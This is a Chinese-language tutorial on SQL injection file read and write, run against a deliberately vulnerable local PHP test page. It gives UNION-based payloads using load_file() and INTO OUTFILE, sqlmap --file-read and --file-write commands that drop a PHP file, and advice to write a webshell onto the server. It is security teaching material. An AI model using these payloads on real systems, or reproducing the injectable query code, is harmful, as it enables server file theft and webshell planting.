##SQL_injection File

###0x01
#####SQL注入中文件读取和写入简介

当在注入过程中，发现有注入点，且具有读写文件权限的话，就没有必要尝试登陆后台，找上传点传马了。
目标是读文件内容的话就直接读，若是其他目标的话，可以直接写个一句话或者直接写个shell进去。

>测试代码

```
	<?php
		error_reporting(E_ALL ^ E_NOTICE);
		include "config.php";
		
		$key = $_GET['key'];
		$select = mysql_query("SELECT * FROM users where username='".$key."'");
		while($row = mysql_fetch_array($select))
		{
			echo "$row[id]" . " " . "$row[username]" . " " . "$row[password]" . "</br>";
		}
	?>
```

>数据库结构

Tablename:users
```
	id		username		password
	1		admin			password
	2		xiaoming		123456
```

网站绝对路径：D:\Wamp\www\

###0x02
#####手工读取和写入文件

>读取

```
127.0.0.1/index.php?key=admin' order by 3 -- -
```
字段数为3

```
http://127.0.0.1/index.php?key=admin' and 1=2 union select 1,2,3 from users -- -
```
回显位1,2,3

```
http://127.0.0.1/index.php?key=admin' and 1=2 union select 1,2,load_file("D:\\1.txt") from users -- -
```
读取D:\\\1.txt文件，并在回显位3的位置显示


>写入

```
http://127.0.0.1/index.php?key=admin' and 1=2 union select 1,2,"abc" into outfile "D:\\2.txt"-- -
```
将"1 2 abc"写入D：\\\2.txt这个文件


###0x03
#####利用sqlmap读取和写入文件

>读取

```
sqlmap -u "http://127.0.0.1/index.php?key=admin" --file-read "D:\\1.txt"
```
读取D:\\\1.txt文件

>写入

```
sqlmap -u "http://127.0.0.1/index.php?key=admin" --file-write "D:\\1.txt" --file-dest "D:\\2.php"
```
将本机上D:\\\1.txt文件写入到服务器上D:\\\2.php中


</br></br>
-----------------------
PS:
sqlmap得到当前数据库
```sqlmap.py -u "url" --current-db```
sqlmap得到当前用户
```sqlmap.py -u "url" --current-user```


</br></br></br></br>